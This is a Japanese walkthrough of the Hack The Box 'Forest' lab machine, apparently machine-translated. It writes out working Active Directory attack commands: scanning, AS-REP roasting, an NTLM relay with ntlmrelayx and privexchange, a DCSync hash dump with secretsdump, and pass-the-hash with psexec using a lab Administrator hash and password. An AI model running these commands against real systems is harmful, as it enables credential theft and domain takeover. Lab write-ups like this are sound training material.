偵察


このマシンのIPアドレスは10.10.10.161で、/ etc / hostsに追加しています。
10.10.10.161 forest.htb
まず、開いているポートをスキャンします。nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。tun0インターフェースからすべてのTCPおよびUDPポートを毎秒1000パケットの速度でスキャンします。

masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000



ホストに開いているポートがたくさんあり、masscanによって提供された結果が正しいことを確認することにしました。これを行うには、nmapでポートの状態をスキャンするだけです。

nmap 10.10.10.161 -p135,636,3269,49676,49665,53,593,49671,9389,49667,5985,49666,389,88,49684,464,3268,49677,47001,139,445,49714



しかし、nmapはすべてを確認しました。次に、nmapが認識しているポートに関する詳細情報を収集する必要があります。

nmap -A 10.10.10.161 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001



次に、システムからできるだけ多くの情報を取得する必要があります。これには、enum4linuxを使用しました。しかし、彼は私たちにほとんど情報を与えませんでした。グループ、パスワード要件、SMBv1と共有リソースの不足など。ただし、ユーザーのリストを取得しました。

enum4linux -a 10.10.10.161



Kerberosがホストで実行されているため、UACでDONT_REQ_PREAUTHフラグが設定されているユーザーアカウントがあるかどうかを確認する必要があります。 UACフラグとその意味については、こちらをご覧ください。 DONT_REQ_PREAUTHフラグは、このアカウントではKerberos認証が不要であることを意味します。

まず、アクティブなユーザーアカウントを見つけます。これにより、samrdumpスクリプトがimpacketに含まれるようになります。

impacket-samrdump forest.htb





スクリプトは最初にすべてのユーザーを表示し、次に各ユーザーの詳細情報を表示します。これにより、Administratorアカウントがアクティブで、Guestがアクティブでないことがわかります。これで、アクティブユーザーのリストを作成できます。



アクティブユーザーのリストがある場合は、必要なフラグの可用性を確認できます。これは、同じくimpacketパッケージの一部であるGetNPUsersスクリプトを使用して行うことができます。htb.localドメイン、ドメインコントローラー10.10.10.161、Kerberos認証方法（-k）、パスワードなしのオプション、およびユーザーのリストを指定します。

GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -k -no-pass -usersfile ADUsers.txt



このフラグは、svc-alfrescoを除くすべてのユーザーに対して設定されているわけではないと言われています。私のバージョンのインパケット（21-dev）では、ハッシュは自動的に要求されます。

したがって、特権グループのサービスアカウントで処理され、特権を増やすことができるため、Exchange Windowsアクセス許可グループのメンバーになる必要があると言われます。

ユーザーは現在このグループに属していません。追加して、ユーザーグループを確認しましょう。

ユーザーがグループに追加されました。これが何をもたらすか見てみましょう。Exchange Windowsアクセス許可グループには、Active Directoryのドメインオブジェクトに対するWriteDACL（権利を付与する権利）権限があり、グループの任意のメンバーがDCSync操作を含むドメイン特権を変更できます。

DCSync


DCSync攻撃について少し。 Active Directoryレプリケーションは、ドメインコントローラの1つに加えられた変更がドメイン内の残りのコントローラと同期されるプロセスです。必要な権限を取得したら、レプリケーションリクエストを開始できます。これにより、パスワードハッシュを含む、Active Directoryに保存されているデータを取得できます。

つまり、Active Directoryユーザーのパスワードハッシュを同期し、NTLMプロトコル（Microsoftネットワーク認証プロトコルによって開発）またはKerberosを使用して任意のサービスにログインできます。攻撃には、impacketパッケージのprivexchange.pyとntlmrelayx.pyの2つのツールの使用が含まれます。

最初に、svc-alfrescoアカウントを使用して、ドメインコントローラーに対してLDAPリレーモードでntlmrelayxを実行します。

ntlmrelayx.py -t ldap://htb.local --escalate-user svc-alfresco



すべてのサービスが実行されており、接続を待機しています。今privexを使用してください。

python privexchange.py 10.10.10.161 -ah _ip -d htb.local -u svc-alfresco -p s3rvice



そして、私はいくつかのミスを飛ばし、数分をくまなく調べ、修正しないことにしました。ブラウザで上記のリンクをたどり、svc-alfresco資格情報を使用して認証を渡すことができます。ntlmrelayxのウィンドウに、接続情報が表示されます。



次に、secretsdumpを使用してDCSync攻撃を実行します。

secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc



いいよ すべてのアカウントを複製することができました。

パスザハッシュ攻撃


この攻撃により、攻撃者はNTLMまたはLMプロトコルを使用して認証されたリモートサーバーにログインできます。

NTLM認証プロトコルを使用するシステムでは、パスワードが通信チャネルを介してクリアテキストで送信されることはありません。代わりに、質問と回答の認証スキームの応答段階で、ハッシュの形式で適切なシステム（ドメインコントローラーなど）に転送されます。

Windowsアプリケーションは、ユーザーにパスワードをクリアテキストで要求し、次にAPI（たとえば、LsaLogonUser）を呼び出します。これにより、パスワードがLMハッシュとNTLMハッシュに変換され、認証プロセス中に渡されます。プロトコルを分析したところ、認証を成功させるために、パスワードを明確な形式で知る必要はなく、代わりにそのハッシュのみを使用できることがわかりました。

この攻撃は、ネットワーク認証プロトコルの実装の弱点に基づいています。これは、パスワードハッシュがソルトを使用せずに送信されるため、セッションごとに変更されないままです（ユーザーパスワードが変更されるまで）。つまり、攻撃者にとって、パスワードハッシュはパスワードそのものと同じです。

psexecを使用して攻撃を実行します。

psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
